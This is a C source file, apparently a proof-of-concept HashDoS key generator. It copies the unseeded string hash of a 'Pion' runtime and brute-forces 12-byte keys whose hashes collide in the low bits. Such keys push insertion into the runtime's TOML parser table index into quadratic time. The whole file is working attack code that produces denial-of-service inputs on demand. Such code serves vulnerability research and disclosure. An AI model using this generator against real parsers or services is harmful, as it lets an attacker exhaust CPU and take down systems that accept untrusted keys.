/* HashDoS key generator for the Pion runtime's unseeded String hash map.
 *
 * pion_str_hash() below is copied verbatim from ~/.pion/share/pion/runtime/pion_rt.c
 * (Pion 0.1.0). It has no per-process seed, and pion_map_probe() indexes with
 * `h & (cap-1)` + linear probing, so keys whose hashes share the low `bits` bits
 * all land in one probe cluster: every insert/lookup into packages/toml's per-table
 * `Map[String, Int]` index then walks the whole cluster -> O(N^2) parse.
 *
 * usage: hashdos_gen <n_keys> <bits> [seed] [counter_start] -> prints n bare keys, one per line
 */
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

typedef struct { const char *data; int64_t len; } PionString;

static inline uint64_t pion_str_hash(const PionString *s) {
    const unsigned char *p = (const unsigned char *)s->data;
    size_t len = (size_t)s->len;
    uint64_t h = 0x517cc1b727220a95ULL ^ ((uint64_t)len * 0x9e3779b97f4a7c15ULL);
    while (len >= 8) {
        uint64_t w;
        memcpy(&w, p, 8);
        h ^= w;
        h *= 0x9e3779b97f4a7c15ULL;
        h ^= h >> 32;
        p += 8;
        len -= 8;
    }
    uint64_t tail = 0;
    if (len >= 4) {
        uint32_t w4;
        memcpy(&w4, p, 4);
        tail = (uint64_t)w4;
        p += 4;
        len -= 4;
        if (len >= 2) {
            uint16_t w2;
            memcpy(&w2, p, 2);
            tail |= ((uint64_t)w2) << 32;
            p += 2;
            len -= 2;
        }
        if (len == 1) {
            tail |= ((uint64_t)p[0]) << 48;
        }
    } else {
        if (len >= 2) {
            uint16_t w2;
            memcpy(&w2, p, 2);
            tail = (uint64_t)w2;
            p += 2;
            len -= 2;
        }
        if (len == 1) {
            tail |= ((uint64_t)p[0]) << 16;
        }
    }
    h ^= tail;
    h *= 0xbf58476d1ce4e5b9ULL;
    h ^= h >> 27;
    h *= 0x94d049bb133111ebULL;
    h ^= h >> 31;
    return h;
}

static const char ALPHA[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-";

int main(int argc, char **argv) {
    if (argc < 3) { fprintf(stderr, "usage: %s n bits [seed]\n", argv[0]); return 2; }
    long n = atol(argv[1]);
    int bits = atoi(argv[2]);
    uint64_t x = argc > 3 ? strtoull(argv[3], 0, 10) : 0x1234567ULL;
    uint64_t mask = (bits >= 64) ? ~0ULL : ((1ULL << bits) - 1);
    char key[13];
    key[12] = 0;
    PionString s = { key, 12 };
    long found = 0;
    /* 12-byte keys: 8 bytes fixed by a counter (unique), 4-byte tail searched. */
    uint64_t start = argc > 4 ? strtoull(argv[4], 0, 10) : 0;
    for (uint64_t ctr = start; found < n; ctr++) {
        uint64_t c = ctr;
        for (int i = 0; i < 8; i++) { key[i] = ALPHA[c & 63]; c >>= 6; }
        for (uint32_t t = 0; t < (1u << 24); t++) {
            uint32_t u = t ^ (uint32_t)x;
            key[8] = ALPHA[u & 63]; key[9] = ALPHA[(u >> 6) & 63];
            key[10] = ALPHA[(u >> 12) & 63]; key[11] = ALPHA[(u >> 18) & 63];
            if ((pion_str_hash(&s) & mask) == 0) {
                puts(key);
                found++;
                break;
            }
        }
    }
    return 0;
}
